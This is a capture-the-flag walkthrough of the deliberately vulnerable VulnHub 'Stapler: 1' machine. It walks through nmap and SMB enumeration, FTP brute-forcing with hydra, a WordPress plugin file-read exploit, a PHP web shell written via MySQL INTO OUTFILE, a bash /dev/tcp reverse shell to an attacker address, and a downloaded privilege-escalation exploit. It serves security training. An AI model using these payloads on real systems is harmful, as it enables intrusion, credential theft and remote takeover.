#  Stapler: 1

https://www.vulnhub.com/entry/stapler-1,150/

Definitely one of the more interesting ones because there are lots of different paths to look at. We do a netdiscover to find `192.168.1.96` and do an nmap scan.

```
root@kali:~# nmap -A -p- -T5 192.168.1.96
Starting Nmap 7.12 ( https://nmap.org ) at 2016-06-29 15:36 BST
Nmap scan report for red.initech.vulnlab.fbcnt.in (10.1.11.137)
Host is up (0.00022s latency).
Not shown: 65523 filtered ports
PORT      STATE  SERVICE     VERSION
20/tcp    closed ftp-data
21/tcp    open   ftp         vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: Can't parse PASV response: "Permission denied."
22/tcp    open   ssh         OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 81:21:ce:a1:1a:05:b1:69:4f:4d:ed:80:28:e8:99:05 (RSA)
|_  256 5b:a5:bb:67:91:1a:51:c2:d3:21:da:c0:ca:f0:db:9e (ECDSA)
53/tcp    open   domain      dnsmasq 2.75
| dns-nsid:
|   id.server: patriot.fbcnt.in
|_  bind.version: dnsmasq-2.75
80/tcp    open   http
|_http-title: 404 Not Found
123/tcp   closed ntp
137/tcp   closed netbios-ns
138/tcp   closed netbios-dgm
139/tcp   open   netbios-ssn Samba smbd 3.X (workgroup: RED)
666/tcp   open   doom?
3306/tcp  open   mysql       MySQL 5.7.12-0ubuntu1
| mysql-info:
|   Protocol: 53
|   Version: .7.12-0ubuntu1
|   Thread ID: 27
|   Capabilities flags: 63487
|   Some Capabilities: LongPassword, IgnoreSpaceBeforeParenthesis, ConnectWithDatabase, SupportsTransactions, Support41Auth, FoundRows, Speaks41ProtocolOld, InteractiveClient, Speaks41ProtocolNew, SupportsLoadDataLocal, ODBCClient, SupportsCompression, IgnoreSigpipes, DontAllowDatabaseTableColumn, LongColumnFlag
|   Status: Autocommit
Kv\x12\x19`"dx\s\x01ptM"
12380/tcp open   http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Tim, we need to-do better next year for Initech

Host script results:
|_nbstat: NetBIOS name: RED, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.3.9-Ubuntu)
|   Computer name: red
|   NetBIOS computer name: RED
|   Domain name:
|   FQDN: red
|_  System time: 2016-06-29T16:38:10+01:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smbv2-enabled: Server supports SMBv2 protocol

TRACEROUTE
HOP RTT     ADDRESS
1   0.22 ms red.initech.vulnlab.fbcnt.in (10.1.11.137)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 106.26 seconds
```

I had a look at `enum4linux 192.168.1.96` to find some information about samba version, users, any public directories. Similary, ftp can be logged in with anonymous to find a file with some user. I went on to check `http://192.168.1.96:666/` to find some binary looking file. I saved it as doom and found it was a zip file `file doom`, unzipping it `unzip doom` gives us an image. It some error message with the name Scott, ssh to us gives us a name Barry.

## Wordpress and MySQL

We check the port 12380 and find another webpage, we do a nikto and dirb scan `nikto -h  https://192.168.190.131:12380 and dirb https://192.168.190.131:12380`. We also see that it is a wordpress website, using `wpscan --url https://192.168.1.96:12380/blogblog/ --enumerate u` and  will give us some more exploits.

```
root@kali:~/test# wpscan --url https://192.168.1.96:12380/blogblog/ --enumerate u --disable-tls-checks
root@kali:~/test# wpscan --url https://192.168.1.96:12380/blogblog/ --enumerate ap --disable-tls-checks
```

We see also find the plugins directory by traversing from nikto's results, https://192.168.1.96:12380/blogblog/wp-content/plugins/. Those plugins did not show up on the enumeration so we can check if they have exploits. `searchsploit advanced video` gives us a hit. Reading the code `/usr/share/exploitdb/platforms//php/webapps/39646.py` we can modify it e.g. https://192.168.1.96:12380/blogblog/wp-admin/admin-ajax.php?action=ave_publishPost&title=random&short=1&term=1&thumb=../wp-config.php 

Instead of viewing it from the redirected link it goes to, we see that it makes a new blog post with the img it created. Saving this image and reading it will give us the requested file from our LFI code injection. From the wp-config file we get root:plbkac and we can log in with the credential through https://192.168.1.96:12380/phpmyadmin/. Extracting the wordpress > wp_users table and using hashcat/John we get a pass, `john:incorrect`. Other older walkthrough, they logged into wordpress then upload a shell through the plugin section, but this now asks for the ftp, which doesnt work with anonymous:anonymous or elly:ylle.

Instead, since we have root access in MySQL, we can execute `Select "<?php echo shell_exec($_GET['cmd']);?>" into outfile "/var/www/https/blogblog/wp-content/uploads/shell.php";` and visit `https://192.168.1.96:12380/blogblog/wp-content/uploads/shell.php?cmd=whoami

Now, we can actually do `bash -i >& /dev/tcp/10.0.0.1/8080 0>&1` and on attacker's vm `nc -lvp 1234` to get a reverse shell. To make things easier, we can spawn a [TTY shell](https://netsec.ws/?p=337) `python -c 'import pty; pty.spawn("/bin/sh")'`

## FTP
We can also log into ftp and use anonymous:anonymous. We find the `cat note` with elly and can use hydra.

```
root@kali:~/test# hydra -l elly -P /usr/share/wordlists/rockyou.txt -e nsr ftp://192.168.1.96
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2017-10-01 02:57:49
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344402 login tries (l:1/p:14344402), ~896526 tries per task
[DATA] attacking ftp://192.168.1.96:21/
[21][ftp] host: 192.168.1.96   login: elly   password: ylle
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2017-10-01 02:58:03

```

From there, we can `get passwd` and get a list of users which we can use for ssh.

## Privilege Escalation
From other walkthrough, one way to easily get it was too log into Peter's account and run `./sudo_as_admin_successful`. This can be found by `cat */.bash_history` to see anything useful, passwords may be seen on CTF challenges, but in real-life these are usually prompt. But, lets say we didn't, we can `wget https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/39772.zip` and run that exploit to gain privleges.


Note: Some information I found useful, but did not lead too any useful results. Just some reference for myself.

```
root@kali:~/test# smbclient -L 192.168.1.96
WARNING: The "syslog" option is deprecated
Enter WORKGROUP\root's password: 
OS=[Windows 6.1] Server=[Samba 4.3.9-Ubuntu]

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	kathy           Disk      Fred, What are we doing here? <--------------- looks suspicious
	tmp             Disk      All temporary files should be stored here
	IPC$            IPC       IPC Service (red server (Samba, Ubuntu))
OS=[Windows 6.1] Server=[Samba 4.3.9-Ubuntu]

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	HOME                 BTHUB3
	WORKGROUP            RED
    
root@kali:~/test# smbclient //fred/kathy -I 192.168.1.96 <-------- fred had access to kathy's share
WARNING: The "syslog" option is deprecated
Enter WORKGROUP\root's password: 
OS=[Windows 6.1] Server=[Samba 4.3.9-Ubuntu]
smb: \> ls
  .                                   D        0  Fri Jun  3 17:52:52 2016
  ..                                  D        0  Mon Jun  6 22:39:56 2016
  kathy_stuff                         D        0  Sun Jun  5 16:02:27 2016
  backup                              D        0  Sun Jun  5 16:04:14 2016

		19478204 blocks of size 1024. 16347816 blocks available
        
(get all files of interests)
```
